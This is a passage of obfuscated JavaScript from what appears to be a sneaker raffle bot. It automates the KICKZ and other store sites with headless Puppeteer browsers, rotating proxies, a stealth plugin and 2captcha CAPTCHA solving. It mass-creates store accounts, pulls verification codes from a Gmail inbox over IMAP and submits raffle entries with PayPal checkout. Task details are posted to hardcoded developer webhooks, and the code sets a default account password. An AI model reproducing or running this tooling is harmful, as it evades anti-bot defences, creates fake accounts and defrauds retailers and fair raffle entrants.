                        if (_0x373707[_0xbd91d5]['Size'] == 'RANDOM') {
                            const _0x137870 = await _0x3bd858['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x4d12a5 => {
                                return _0x4d12a5['map'](_0x6aeeea => _0x6aeeea['value']);
                            });
                            var _0x39e257 = Math['round'](Math['random']() * (_0x137870['length'] - 0x2));
                            await _0x3bd858['select']('#shoesize', _0x137870[_0x39e257 + 0x1]), await _0x28bb81(0x3e8);
                        } else {
                            const _0x575a4b = await _0x3bd858['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x19bb5e => {
                                return _0x19bb5e['map'](_0x4f4ef8 => _0x4f4ef8['innerText']);
                            }), _0x26a708 = await _0x3bd858['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0xaaaa35 => {
                                return _0xaaaa35['map'](_0x12d4d1 => _0x12d4d1['value']);
                            });
                            var _0x363efd = _0x373707[_0xbd91d5]['Size'];
                            for (var _0x24db98 = 0x1; _0x24db98 < _0x26a708['length']; _0x24db98++) {
                                var _0x422be1 = _0x575a4b[_0x24db98]['split']('\x20')[0x0];
                                if (_0x422be1 == _0x363efd) {
                                    await _0x3bd858['select']('#shoesize', _0x26a708[_0x24db98]);
                                    break;
                                } else {
                                    if (_0x24db98 + 0x1 == _0x26a708['length'])
                                        throw new Error('Size\x20Not\x20Found..');
                                }
                            }
                        }
                        await _0x3bd858['waitForSelector']('#comp_address1'), await _0x3bd858['type']('#comp_address1', _0x373707[_0xbd91d5]['Address1'] + '\x20' + _0x373707[_0xbd91d5]['HouseNumber']), await _0x3bd858['waitForSelector']('#comp_address2'), await _0x3bd858['type']('#comp_address2', '' + _0x373707[_0xbd91d5]['Address2']), await _0x3bd858['waitForSelector']('#comp_address2'), await _0x3bd858['type']('#comp_address3', '' + _0x373707[_0xbd91d5]['City']), await _0x3bd858['waitForSelector']('#comp_postcode'), await _0x3bd858['type']('#comp_postcode', '' + _0x373707[_0xbd91d5]['Zip']), console['log'](_0x51d312() + '\x20[' + _0x5c3fc7['name'] + ']\x20Task\x20' + (_0xbd91d5 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x28bb81(0x4b0), await _0x3bd858['click']('label#emailhold'), await _0x28bb81(0x5dc), await _0x3bd858['click']('#preauth_tandc_email\x20>\x20label'), await _0x28bb81(0x5dc), await _0x3bd858['click']('#submit'), await _0x3bd858['waitForSelector']('#paymentWrap'), console['log'](_0x51d312() + '\x20[' + _0x5c3fc7['name'] + ']\x20Task\x20' + (_0xbd91d5 + 0x1) + '\x20:\x20' + _0x2367c9['blue']('Awaiting\x20Paypal\x20Payment')), _0x21bdf6['on']('targetcreated', async _0x5838d5 => {
                            if (_0x5838d5['type']() === 'page') {
                                const _0x3f8b52 = await _0x5838d5['page']();
                                async function _0x5e4f59() {
                                    try {
                                        await _0x3bd858['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0x35698f = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                async function _0x114007() {
                                    try {
                                        await _0x3bd858['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0x14580e = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                _0x114007(), _0x5e4f59(), await _0x28bb81(0x493e0);
                            }
                        });
                        async function _0x5e42b4() {
                            for (let _0x17ac5e = 0x0; _0x17ac5e < 0x12c; _0x17ac5e++) {
                                if (_0x14580e == !![]) {
                                    _0x5964b3 = 'no', _0x4d8543(_0x373707[_0xbd91d5], _0x5c3fc7), console['log'](_0x2367c9['green'](_0x51d312() + '\x20[' + _0x5c3fc7['name'] + ']\x20Task\x20' + (_0xbd91d5 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                    if (_0x37b240['webhook'] != undefined && _0x37b240['webhook'] != '')
                                        try {
                                            await _0x40545a(_0x37b240['webhook'], _0x1ea802['succesDEVMSG']);
                                        } catch {
                                        }
                                    await _0x28bb81(0xc8), await _0x40545a(_0x1efb60, _0x1ea802['succesDEVMSG']), await _0x28bb81(0xc8);
                                    try {
                                        await _0x40545a(_0x4a9ac0, _0x1ea802['succesPUBMSG']);
                                    } catch {
                                    }
                                    return;
                                } else {
                                    if (_0x35698f)
                                        throw new Error('Paypal\x20Error:\x20Target\x20closed');
                                    else
                                        await _0x28bb81(0x3e8);
                                }
                            }
                            throw new Error('Paypal\x20Error');
                        }
                        await _0x28bb81(0xbb8), await _0x3bd858['click']('.zoid-outlet'), await _0x28bb81(0x7d0), await _0x5e42b4();
                    } catch (_0x300d5f) {
                        console['log'](_0x2367c9['red'](_0x51d312() + '\x20[' + _0x5c3fc7['name'] + ']\x20Task\x20' + (_0xbd91d5 + 0x1) + '\x20:\x20' + _0x300d5f)), _0x21ba84 = '' + _0x300d5f;
                        var _0x4af18b = await _0xb1aeae(_0x373707[_0xbd91d5], _0x5c3fc7, 'dev', !![], _0x21ba84);
                        _0x1ea802['errorDEV'] = { 'embeds': [_0x4af18b] }, _0x37b240['webhook'] != undefined && _0x37b240['webhook'] != '' && await _0x40545a(_0x37b240['webhook'], _0x1ea802['errorDEV']), await _0x40545a(_0x2b1b7c, _0x1ea802['errorDEV']);
                    } finally {
                        _0x21bdf6 && _0x21bdf6['close']();
                        if (_0x5964b3 == 'yes' && _0x8ffbf3 != 0x5 && _0x21ba84 != 'Size\x20Not\x20Found') {
                            console['log'](_0x2367c9['red'](_0x51d312() + '\x20[' + _0x5c3fc7['name'] + ']\x20Task\x20' + (_0xbd91d5 + 0x1) + '\x20:\x20Retrying')), _0xbd91d5 = _0xbd91d5 - 0x1, _0x8ffbf3 = _0x8ffbf3 + 0x1;
                            continue;
                        }
                        _0x5964b3 == 'yes' && _0x8ffbf3 >= 0x5 && (_0x1322f8(afew[_0xbd91d5], _0x5c3fc7), _0x5964b3 = 'no', _0x8ffbf3 = 0x0), console['log']('Waiting\x20for\x20' + _0x37b240['delay'] + '\x20ms'), await _0x28bb81(_0x37b240['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x1138de, _0xf81e39, _0x558c83) {
                    _0x3b2a97['use'](_0x2b8567()), _0x3b2a97['use'](_0x5af5b0({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x37b240['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x3a253e = 0x0; _0x3a253e < _0xf81e39['length']; _0x3a253e++) {
                        const _0x553a1d = 'https://www.kickz.com/login';
                        if (_0x40a7f2 != 'yes')
                            var _0x40a7f2 = '', _0x5c43e2 = 0x0;
                        _0x50109a(_0x1138de['name'] + '\x20Task\x20' + (_0x3a253e + 0x1) + '\x20/\x20' + _0xf81e39['length'] + '\x20||\x20File:\x20' + _0x4f3156 + '\x20Proxies:\x20' + _0x397c57), await _0x129938(_0xf81e39, _0x3a253e);
                        var _0x311879 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x340f37
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x37b240['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x2de2a3
                                }
                            ]
                        }];
                        const _0x1dcbd8 = { 'embeds': _0x311879 };
                        var _0x218aae = await _0xb1aeae(_0xf81e39[_0x3a253e], _0x1138de, 'acc', ![]);
                        const _0x36c6df = { 'succesDEVMSG': { 'embeds': [_0x218aae] } };
                        if (_0xf81e39[_0x3a253e]['Email'] == '' || _0xf81e39[_0x3a253e]['FirstName'] == '' || _0xf81e39[_0x3a253e]['LastName'] == '') {
                            console['log'](_0x51d312() + '\x20[' + _0x1138de['name'] + ']\x20Task\x20' + (_0x3a253e + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0xf81e39[_0x3a253e]['Password'] == '' && (_0xf81e39[_0x3a253e]['Password'] = 'JRaffles23!');
                        if (_0x37b240['useRandomProxy'] = ![])
                            var _0x5e4af5 = _0x558c83[_0x3a253e]['split'](':');
                        else
                            var _0x5ba93d = Math['round'](Math['random']() * (_0x558c83['length'] - 0x1)), _0x5e4af5 = _0x558c83[_0x5ba93d]['split'](':');
                        const _0x1eaf02 = await _0x3b2a97['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x5e4af5[0x0] + ':' + _0x5e4af5[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x1e0572 = await _0x1eaf02['newPage']();
                            await _0x1e0572['authenticate']({
                                'username': '' + _0x5e4af5[0x2],
                                'password': '' + _0x5e4af5[0x3]
                            }), console['log'](_0x51d312() + '\x20[' + _0x1138de['name'] + ']\x20Task\x20' + (_0x3a253e + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1e0572['setRequestInterception'](!![]), _0x1e0572['on']('request', _0x3fe7c4 => {
                                _0x3fe7c4['resourceType']() === 'image' || _0x3fe7c4['resourceType']() === 'font' || _0x3fe7c4['resourceType']() === 'media' ? _0x3fe7c4['abort']() : _0x3fe7c4['continue']();
                            }), await _0x1e0572['goto'](_0x553a1d), await _0x28bb81(0xbb8), console['log'](_0x51d312() + '\x20[' + _0x1138de['name'] + ']\x20Task\x20' + (_0x3a253e + 0x1) + '\x20:\x20Starting\x20Registration'), await _0x1e0572['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x1e0572['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x1e0572['waitForSelector']('#button-register'), await _0x28bb81(0x7d0), await _0x1e0572['evaluate'](() => {
                                const _0x4dd1ee = document['querySelector']('#button-register');
                                _0x4dd1ee['click']();
                            }), console['log'](_0x51d312() + '\x20[' + _0x1138de['name'] + ']\x20Task\x20' + (_0x3a253e + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x28bb81(0x1388), await _0x1e0572['waitForSelector']('#customer_salutation'), await _0x1e0572['select']('#customer_salutation', 'mr'), await _0x28bb81(0x7d0), await _0x1e0572['waitForSelector']('#customer_firstname'), await _0x1e0572['type']('#customer_firstname', '' + _0xf81e39[_0x3a253e]['FirstName']), await _0x28bb81(0x352), await _0x1e0572['waitForSelector']('#customer_lastname'), await _0x1e0572['type']('#customer_lastname', '' + _0xf81e39[_0x3a253e]['LastName']), await _0x28bb81(0x352), await _0x1e0572['type']('#email-input', '' + _0xf81e39[_0x3a253e]['Email']), await _0x28bb81(0x352), await _0x1e0572['type']('#email-confirm-input', '' + _0xf81e39[_0x3a253e]['Email']), await _0x28bb81(0x352), await _0x1e0572['type']('#register-password', '' + _0xf81e39[_0x3a253e]['Password']), await _0x28bb81(0x352), await _0x1e0572['type']('#password-confirm', '' + _0xf81e39[_0x3a253e]['Password']), await _0x28bb81(0x352), console['log'](_0x51d312() + '\x20[' + _0x1138de['name'] + ']\x20Task\x20' + (_0x3a253e + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0x1e0572['click']('#consent'), await _0x28bb81(0x1f4);
                            const _0x1028e0 = await _0x1e0572['$']('div.inputErrorMsg.b-form_section-message');
                            if (_0x1028e0) {
                                console['log'](_0x2367c9['red'](_0x51d312() + '\x20[' + _0x1138de['name'] + ']\x20Task\x20' + (_0x3a253e + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                                continue;
                            }
                            await _0x1e0572['click']('#buttonRegister');
                            try {
                                await _0x1e0572['waitForSelector']('#verificationCode');
                            } catch {
                                throw new Error('Account\x20already\x20registered');
                            }
                            console['log'](_0x51d312() + '\x20[' + _0x1138de['name'] + ']\x20Task\x20' + (_0x3a253e + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0xf81e39[_0x3a253e]['Email']), await _0x28bb81(0x4b0);
                            async function _0x5158a0() {
                                var _0x1e9474, _0x314540 = ![];
                                for (var _0x1575eb = 0x0; _0x1575eb < 0x18; _0x1575eb++) {
                                    async function _0x2f7700() {
                                        var _0x142adf = new _0x575543({
                                            'user': _0x37b240['masterMail'],
                                            'password': _0x37b240['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x3eba0e(_0x19aae8) {
                                            _0x142adf['openBox']('INBOX', ![], _0x19aae8);
                                        }
                                        _0x142adf['once']('ready', function () {
                                            console['log'](_0x51d312() + '\x20[' + _0x1138de['name'] + ']\x20Task\x20' + (_0x3a253e + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x3eba0e(function (_0x4e413c, _0x309dfb) {
                                                console['log'](_0x51d312() + '\x20[' + _0x1138de['name'] + ']\x20Task\x20' + (_0x3a253e + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x4e413c)
                                                    throw _0x4e413c;
                                                _0x142adf['seq']['search'](['UNSEEN'], function (_0x355b28, _0x2224c3) {
                                                    if (!_0x2224c3 || !_0x2224c3['length'])
                                                        console['log'](_0x51d312() + '\x20[' + _0x1138de['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x142adf['end']();
                                                    else {
                                                        var _0x635e52 = _0x142adf['seq']['fetch'](_0x2224c3, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x635e52['on']('message', function (_0x53e97d, _0x474829) {
                                                            var _0x284ad3 = '(#' + _0x474829 + ')\x20';
                                                            _0x53e97d['on']('body', function (_0x53a63b, _0x5093f5) {
                                                                _0x565ceb(_0x53a63b, (_0x5921cf, _0x2e61ce) => {
                                                                    if (_0x2e61ce['subject'] == 'Kickz\x20Account\x20Verification\x20Code') {
                                                                        var _0x44cb4c = _0x2e61ce['html']['split']('<div\x20style=\x22display:block;font-family:Arial,sans-serif;font-size:\x2030px;font-weight:\x20600;line-height:24px;color:#333333\x22>'), _0x2ad968 = _0x44cb4c[0x1]['split']('<')[0x0];
                                                                        _0x1e9474 = _0x2ad968;
                                                                    }
                                                                });
                                                            }), _0x53e97d['once']('end', function () {
                                                            });
                                                        }), _0x635e52['once']('error', function (_0x546063) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x635e52['once']('end', function () {
                                                            _0x142adf['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x142adf['once']('error', function (_0x26b169) {
                                            console['log'](_0x2367c9['red'](_0x26b169['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x314540 = !![];
                                        }), _0x142adf['once']('end', async function () {
                                        }), _0x142adf['connect']();
                                    }
                                    _0x2f7700(), await _0x28bb81(0x1388);
                                    if (_0x1e9474)
                                        return _0x1e9474;
                                    if (_0x314540)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x1575eb == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x5158a0(), _0x28bb81(0x320), console['log'](_0x51d312() + '\x20[' + _0x1138de['name'] + ']\x20Task\x20' + (_0x3a253e + 0x1) + '\x20:\x20Verifying..'), await _0x1e0572['type']('#verificationCode', code), await _0x28bb81(0x1f4), await _0x1e0572['click']('#buttonVerify'), await _0x28bb81(0x190), await _0x1e0572['click']('#buttonVerify'), await _0x28bb81(0x3e8);
                            try {
                                await _0x1e0572['waitForSelector']('div.b-user_greeting'), _0x40a7f2 = 'no', console['log'](_0x2367c9['green'](_0x51d312() + '\x20[' + _0x1138de['name'] + ']\x20Task\x20' + (_0x3a253e + 0x1) + '\x20:\x20Account\x20' + _0xf81e39[_0x3a253e]['Email'] + '\x20Generated\x20&\x20Verified!')), _0x5e446e['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0xf81e39[_0x3a253e]['Email'] + ',' + _0xf81e39[_0x3a253e]['Password'] + ','), console['log'](_0x51d312() + '\x20[' + _0x1138de['name'] + ']\x20Task\x20' + (_0x3a253e + 0x1) + '\x20:\x20Account\x20' + _0xf81e39[_0x3a253e]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                                try {
                                    _0x37b240['webhook'] != undefined && _0x37b240['webhook'] != '' && await _0x40545a(_0x37b240['webhook'], _0x36c6df['succesDEVMSG']);
                                } catch {
                                }
                                await _0x40545a(_0x14be92, _0x36c6df['succesDEVMSG']);
                            } catch {
                                _0x40a7f2 = 'no', console['log'](_0x2367c9['red'](_0x51d312() + '\x20[' + _0x1138de['name'] + ']\x20Task\x20' + (_0x3a253e + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0x2367c9['red'](_0x51d312() + '\x20[' + _0x1138de['name'] + ']\x20Task\x20' + (_0x3a253e + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
                            }
                        } catch (_0x91c7c8) {
                            console['log'](_0x2367c9['red'](_0x51d312() + '\x20[' + _0x1138de['name'] + ']\x20Task\x20' + (_0x3a253e + 0x1) + '\x20:\x20' + _0x91c7c8)), _0x311879[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0x311879[0x0]['description'] = '' + _0x91c7c8, await _0x40545a(_0x2b1b7c, _0x1dcbd8), _0x40a7f2 = 'yes';
                        } finally {
                            _0x1eaf02 && _0x1eaf02['close']();
                            if (_0x40a7f2 == 'yes' && _0x5c43e2 != 0x5) {
                                console['log'](_0x2367c9['red'](_0x51d312() + '\x20[' + _0x1138de['name'] + ']\x20Task\x20' + (_0x3a253e + 0x1) + '\x20:\x20Retrying')), _0x3a253e = _0x3a253e - 0x1, _0x5c43e2 = _0x5c43e2 + 0x1;
                                continue;
                            }
                            _0x40a7f2 == 'yes' && _0x5c43e2 >= 0x5 && (_0x1322f8(_0xf81e39[_0x3a253e], _0x1138de), _0x40a7f2 = 'no', _0x5c43e2 = 0x0), console['log']('Waiting\x20for\x20' + _0x37b240['delay'] + '\x20ms'), await _0x28bb81(_0x37b240['delay']);
                        }
                    }
                }
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x4a85db, _0x289d4a, _0x46ae58) {
                    _0x3b2a97['use'](_0x2b8567()), _0x3b2a97['use'](_0x5af5b0({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x37b240['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x45e321 = 0x0; _0x45e321 < _0x289d4a['length']; _0x45e321++) {
                        var _0x2e6250;
                        if (_0xfd8f5a != 'yes')
                            var _0xfd8f5a = '', _0x47c1cf = 0x0;
                        _0x50109a(_0x4a85db['name'] + '\x20Task\x20' + (_0x45e321 + 0x1) + '\x20/\x20' + _0x289d4a['length'] + '\x20||\x20File:\x20' + _0x4f3156 + '\x20Proxies:\x20' + _0x397c57);
                        var _0x4583ec = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Entry',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x340f37
                                },
                                {
                                    'name': 'Product',
                                    'value': '' + _0x289d4a[_0x45e321]['Url']
                                },
                                {
                                    'name': 'Size',
                                    'value': '' + _0x289d4a[_0x45e321]['Size']
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x37b240['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x2de2a3
                                }
                            ]
                        }], _0x3f24aa = await _0xb1aeae(_0x289d4a[_0x45e321], _0x4a85db, 'dev', ![]), _0x52023e = await _0xb1aeae(_0x289d4a[_0x45e321], _0x4a85db, 'pub', ![]);
                        const _0x502e83 = {
                            'succesDEVMSG': { 'embeds': [_0x3f24aa] },
                            'succesPUBMSG': { 'embeds': [_0x52023e] }
                        };
                        await _0x129938(_0x289d4a, _0x45e321);
                        if (_0x289d4a[_0x45e321]['Email'] == '' || _0x289d4a[_0x45e321]['Password'] == '' || _0x289d4a[_0x45e321]['FirstName'] == '' || _0x289d4a[_0x45e321]['LastName'] == '') {
                            console['log'](_0x51d312() + '\x20[' + _0x4a85db['name'] + ']\x20Task\x20' + (_0x45e321 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x37b240['useRandomProxy'] = ![])
                            var _0x11bcbe = _0x46ae58[_0x45e321]['split'](':');
                        else
                            var _0x2052fa = Math['round'](Math['random']() * (_0x46ae58['length'] - 0x1)), _0x11bcbe = _0x46ae58[_0x2052fa]['split'](':');
                        const _0x1bac27 = await _0x3b2a97['launch']({
                            'headless': ![],
                            'args': [
                                '--proxy-server=' + _0x11bcbe[0x0] + ':' + _0x11bcbe[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x253186 = await _0x1bac27['newPage']();
                            await _0x253186['authenticate']({
                                'username': '' + _0x11bcbe[0x2],
                                'password': '' + _0x11bcbe[0x3]
                            }), console['log'](_0x51d312() + '\x20[' + _0x4a85db['name'] + ']\x20Task\x20' + (_0x45e321 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x253186['setRequestInterception'](!![]), _0x253186['on']('request', _0x2e3210 => {
                                _0x2e3210['resourceType']() === 'image' || _0x2e3210['resourceType']() === 'font' || _0x2e3210['resourceType']() === 'media' ? _0x2e3210['abort']() : _0x2e3210['continue']();
                            }), await _0x253186['goto']('' + _0x289d4a[_0x45e321]['Url'], { 'waitUntil': 'networkidle2' }), await _0x28bb81(0x12c);
                            try {
                                await _0x253186['click']('a[title=\x22Sign\x20In\x22]');
                            } catch {
                                await _0x253186['click']('a[title=\x22sign\x20in\x22]');
                            }
                            console['log'](_0x51d312() + '\x20[' + _0x4a85db['name'] + ']\x20Task\x20' + (_0x45e321 + 0x1) + '\x20:\x20Logging\x20in'), await _0x253186['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x253186['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x253186['waitForSelector']('#username'), await _0x253186['type']('#username', _0x289d4a[_0x45e321]['Email']), await _0x253186['waitForSelector']('#password'), await _0x253186['type']('#password', _0x289d4a[_0x45e321]['Password']), await _0x28bb81(0x190), await _0x253186['click']('#buttonSubmit'), await _0x253186['waitForSelector']('div.b-user_greeting'), console['log'](_0x51d312() + '\x20[' + _0x4a85db['name'] + ']\x20Task\x20' + (_0x45e321 + 0x1) + '\x20:\x20Getting\x20Product'), await _0x28bb81(0x1f4), await _0x253186['goto']('' + _0x289d4a[_0x45e321]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x51d312() + '\x20[' + _0x4a85db['name'] + ']\x20Task\x20' + (_0x45e321 + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x289d4a[_0x45e321]['Size']);
                            let _0x23100c = _0x289d4a[_0x45e321]['Size']['replace']('.5', '\x201/2');
                            await _0x253186['click']('button[title=\x22' + _0x23100c + '\x22]'), await _0x28bb81(0x1f4);
                            try {
                                await _0x253186['click']('button[data-tau=\x22add_new_address\x22]');
                            } catch {
                            }
                            await _0x28bb81(0x12c), console['log'](_0x51d312() + '\x20[' + _0x4a85db['name'] + ']\x20Task\x20' + (_0x45e321 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x253186['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0x28bb81(0x12c), await _0x253186['type']('#dwfrm_raffle_addressFields_firstName', _0x289d4a[_0x45e321]['FirstName']), await _0x28bb81(0x12c), await _0x253186['type']('#dwfrm_raffle_addressFields_lastName', _0x289d4a[_0x45e321]['LastName']), await _0x28bb81(0x12c), await _0x253186['select']('#dwfrm_raffle_addressFields_country', _0x289d4a[_0x45e321]['Country']), await _0x28bb81(0x12c), await _0x253186['type']('#dwfrm_raffle_addressFields_city', _0x289d4a[_0x45e321]['City']), await _0x28bb81(0x12c);
                            _0x289d4a[_0x45e321]['Postcode'] == undefined && (_0x289d4a[_0x45e321]['Postcode'] = _0x289d4a[_0x45e321]['Zip']);
                            await _0x253186['type']('#dwfrm_raffle_addressFields_postalCode', _0x289d4a[_0x45e321]['Postcode']), await _0x28bb81(0x12c), await _0x253186['type']('#dwfrm_raffle_addressFields_address1', _0x289d4a[_0x45e321]['Address1']), await _0x28bb81(0x12c), await _0x253186['type']('#dwfrm_raffle_addressFields_address2', _0x289d4a[_0x45e321]['HouseNumber']), await _0x28bb81(0x12c), await _0x253186['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0x289d4a[_0x45e321]['Address2']), await _0x28bb81(0x12c), await _0x253186['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0x28bb81(0x12c), await _0x253186['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0x289d4a[_0x45e321]['Follower']), await _0x28bb81(0x1f4), await _0x253186['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0x28bb81(0x1f4), console['log'](_0x51d312() + '\x20[' + _0x4a85db['name'] + ']\x20Task\x20' + (_0x45e321 + 0x1) + '\x20:\x20' + _0x2367c9['blue']('Awaiting\x20Paypal\x20Payment')), await _0x253186['click']('.b-paypal_button');
                            try {
                                await _0x253186['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), _0xfd8f5a = 'no', _0x4d8543(_0x289d4a[_0x45e321], _0x4a85db), console['log'](_0x2367c9['green'](_0x51d312() + '\x20[' + _0x4a85db['name'] + ']\x20Task\x20' + (_0x45e321 + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x37b240['webhook'] != undefined && _0x37b240['webhook'] != '' && await _0x40545a(_0x37b240['webhook'], _0x502e83['succesDEVMSG']), await _0x28bb81(0xc8), await _0x40545a(_0x1efb60, _0x502e83['succesDEVMSG']), await _0x28bb81(0xc8), await _0x40545a(_0x4a9ac0, _0x502e83['succesPUBMSG']);
                            } catch (_0x2219b2) {
                                console['log'](_0x2367c9['red'](_0x51d312() + '\x20[' + _0x4a85db['name'] + ']\x20Task\x20' + (_0x45e321 + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x2219b2)), _0x2e6250 = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x2219b2;
                                var _0x2ee559 = await _0xb1aeae(_0x289d4a[_0x45e321], _0x4a85db, 'dev', !![], _0x2e6250);
                                _0x502e83['errorDEV'] = { 'embeds': [_0x2ee559] }, _0x37b240['webhook'] != undefined && _0x37b240['webhook'] != '' && await _0x40545a(_0x37b240['webhook'], _0x502e83['errorDEV']), await _0x40545a(_0x2b1b7c, _0x502e83['errorDEV']);
                            }
                        } catch (_0x268f6d) {
                            console['log'](_0x2367c9['red'](_0x51d312() + '\x20[' + _0x4a85db['name'] + ']\x20Task\x20' + (_0x45e321 + 0x1) + '\x20:\x20' + _0x268f6d)), _0x2e6250 = '' + _0x268f6d;
                            var _0x2ee559 = await _0xb1aeae(_0x289d4a[_0x45e321], _0x4a85db, 'dev', !![], _0x2e6250);
                            _0x502e83['errorDEV'] = { 'embeds': [_0x2ee559] }, _0x37b240['webhook'] != undefined && _0x37b240['webhook'] != '' && await _0x40545a(_0x37b240['webhook'], _0x502e83['errorDEV']), await _0x40545a(_0x2b1b7c, _0x502e83['errorDEV']), _0xfd8f5a = 'yes';
                        } finally {
                            _0x1bac27 && _0x1bac27['close']();
                            if (_0xfd8f5a == 'yes' && _0x47c1cf != 0x5) {
                                console['log'](_0x2367c9['red'](_0x51d312() + '\x20[' + _0x4a85db['name'] + ']\x20Task\x20' + (_0x45e321 + 0x1) + '\x20:\x20Retrying')), _0x45e321 = _0x45e321 - 0x1, _0x47c1cf = _0x47c1cf + 0x1;
                                continue;
                            }
                            _0xfd8f5a == 'yes' && _0x47c1cf >= 0x5 && (_0x1322f8(_0x289d4a[_0x45e321], _0x4a85db), _0xfd8f5a = 'no', _0x47c1cf = 0x0), console['log']('Waiting\x20for\x20' + _0x37b240['AfewDelay'] + '\x20ms'), await _0x28bb81(_0x37b240['AfewDelay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'RvxrAV',
                            'custom_source': 'Air\x20Jordan\x201\x20High\x20OG\x20\x27White\x20Cement\x27',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
